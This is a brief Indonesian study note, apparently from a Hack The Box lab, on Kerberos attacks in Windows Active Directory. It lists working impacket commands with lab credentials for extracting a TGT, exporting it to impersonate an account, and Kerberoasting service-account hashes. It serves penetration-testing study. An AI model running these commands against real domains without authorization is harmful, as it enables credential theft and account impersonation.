sistem autentikasi di windows AD tanpa harus mengirimkan password ke jaringan, tapi menggunakan sistem tiket.
# TGT
Kalau kamu punya TGT seseorang → kamu bisa **impersonate** mereka tanpa tahu passwordnya!
selalu gunakan impacket-getTGT untuk extract TGT nya.
```shell
impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95 
```
![](Pasted%20image%2020260617205211.png)

export TGT
```shell
export KRB5CCNAME=MS01\$.ccache 
```
## klist
get TGT and validation with klist
![](Pasted%20image%2020260616204625.png)
# Kerberoasting Attack
```shell
mpacket-GetUserSPNs pirate.htb/'pentest':'p3nt3st2025!&' -dc-ip 10.129.244.95 -request -outputfile kerberoast_hashes.txt
```
![](Pasted%20image%2020260616133752.png)

![](Attachments/Pasted%20image%2020260619104837.png)